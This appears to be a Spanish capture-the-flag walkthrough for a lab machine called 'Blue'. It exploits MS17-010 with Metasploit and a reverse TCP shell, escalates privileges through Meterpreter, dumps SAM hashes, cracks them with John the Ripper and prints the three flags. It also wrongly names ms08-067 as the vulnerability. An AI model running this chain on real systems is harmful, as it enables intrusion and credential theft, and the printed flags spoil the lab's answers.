# Blue

## nmap

Primero hacemos un escaneo de los puertos abiertos y vulnerables con `nmap`:

```
nmap -sV --script vuln -v 10.10.223.217
```

![Escaneo de puertos](images/Pasted%20image%2020250220183330.png)

## Explotación del exploit

Tenemos al menos 3 puertos abiertos con un número de menos de 1000.

Y estos son los resultados del script:

![Resultados del script](images/Pasted%20image%2020250220183432.png)

Nos indica que puede haber una vulnerabilidad, concretamente la de `CVE-2017-0143`. La máquina es vulnerable a `ms08–067`.

Iniciamos la consola de metasploit.

```
msfconsole
```

Buscamos la vulnerabilidad.

```
search ms17-010
```

![Vulnerabilidad ms17-010](images/Pasted%20image%2020250220184127.png)

Seleccionamos el módulo.

```
use 0
```

Mostramos las opciones a configurar para el exploit.

```
options
```

![Opciones de exploit](images/Pasted%20image%2020250220184233.png)

Configuramos la IP del host remoto y la IP local que obtuvimos de la VPN para conectarnos a la máquina.

```
set RHOST IP_Maquina_Vulnerable
set LHOST IP_Maquina_Kali
```

![Configuración de IP](images/Pasted%20image%2020250220184424.png)

Cargamos el payload que vamos a utilizar.

```
set payload windows/x64/shell/reverse_tcp
```

E iniciamos el exploit:

```
run
```

![Ejecución del exploit](images/Pasted%20image%2020250220184633.png)

Tardará unos minutos en completarse.

![Tiempos de ejecución](images/Pasted%20image%2020250221114033.png)

Le damos a `Ctrl + Z` para dejar el proceso en el background.
## Escala de privilegios

Ahora vamos a convertir la shell a meterpreter shell.

```
use post/multi/manage/shell_to_meterpreter
```

![Shell a meterpreter](images/Pasted%20image%2020250220185116.png)

Con el comando `SESSIONS`vemos las sesiones activas de fondo.

![Sesiones activas](images/Pasted%20image%2020250221113308.png)

Asignamos la sesión:

```
set session 1
set LHOST tun0
```

Y ejecutamos el exploit:

```
run
```

Seleccionamos la sesión que nos ha abierto nueva el exploit.

```
sessions 2
```

![Seleccionando la sesión](images/Pasted%20image%2020250221114739.png)

Hemos escalado hasta NT authority en el sistema.

![Escalada de privilegios](images/Pasted%20image%2020250221114824.png)

## Crackeando las contraseñas
Ponemos en el background la sesión con `Ctrl + Z` y listamos los procesos.

```
ps
```

![Listado de procesos](images/Pasted%20image%2020250221115020.png)

Migramos el proceso de `spoolsv.exe`.

```
migrate 1292
```

![Migrando proceso](images/Pasted%20image%2020250221115735.png)

Dumpeamos las contraseñas del sistema.

```
hashdump
```

![Dump de contraseñas](images/Pasted%20image%2020250221115838.png)

Copiamos estos resultados a un fichero llamado `hash.txt` y usamos john the ripper para crackear las contraseñas.

```
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![Crackeo de contraseñas](images/Pasted%20image%2020250221120308.png)

## Flags

Obtenemos la primera flag de la siguiente manera:

![Primera flag](images/Pasted%20image%2020250221120526.png)

```
flag{access_the_machine}
```

La segunda flag se encuentra aquí:

![Segunda flag](images/Pasted%20image%2020250221120740.png)

```
flag{sam_database_elevated_access}
```

Finalmente, la localización de la última flag es en documentos:

![Última flag](images/Pasted%20image%2020250221120846.png)

```
flag{admin_documents_can_be_valuable}
```



































